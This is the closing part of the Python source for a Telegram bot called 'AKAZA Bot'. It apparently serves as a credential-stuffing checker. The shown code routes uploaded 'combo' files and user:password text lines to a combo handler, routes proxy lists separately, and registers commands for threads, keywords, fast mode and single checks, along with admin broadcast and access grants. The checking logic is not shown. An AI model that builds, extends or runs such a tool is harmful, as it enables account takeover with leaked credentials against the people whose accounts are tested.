                except Exception:
                    pass
            await reply('✅ Sent to `' + str(sent) + '/' + str(len(uids)) + '` users')

        else:
            await reply('❌ Unknown. Use `!!help`')

    except Exception as e:
        await u.message.reply_text('❌ `' + str(e) + '`', parse_mode='Markdown')


# ============================================================================
# Document router
# ============================================================================
async def _route_doc(u: Update, c: ContextTypes.DEFAULT_TYPE):
    cap = (u.message.caption or '').lower()
    if 'prox' in cap or 'proxy' in cap:
        await handle_proxies(u, c)
    else:
        await handle_combo(u, c)


# ============================================================================
# MAIN
# ============================================================================
def main():
    logger.info('AKAZA Bot starting — ' + TAG)
    DB._init()
    DB.add_user(ADMIN_ID, 'larpsupport', 'Admin')
    DB.grant(ADMIN_ID)

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler('start',    start))
    app.add_handler(CommandHandler('threads',  cmd_threads))
    app.add_handler(CommandHandler('keywords', cmd_keywords))
    app.add_handler(CommandHandler('addkw',    cmd_addkw))
    app.add_handler(CommandHandler('clearkw',  cmd_clearkw))
    app.add_handler(CommandHandler('fastmode', cmd_fastmode))
    app.add_handler(CommandHandler('check',    single_check))
    app.add_handler(CommandHandler('stats',    cmd_stats))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'^!!'), admin_cmd))
    app.add_handler(MessageHandler(
        filters.Document.FileExtension('txt'), _route_doc))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.Regex(r'[^!].+:.+'),
        handle_combo))

    logger.info('Polling...')
    app.run_polling(drop_pending_updates=True)


if __name__ == '__main__':
    main()
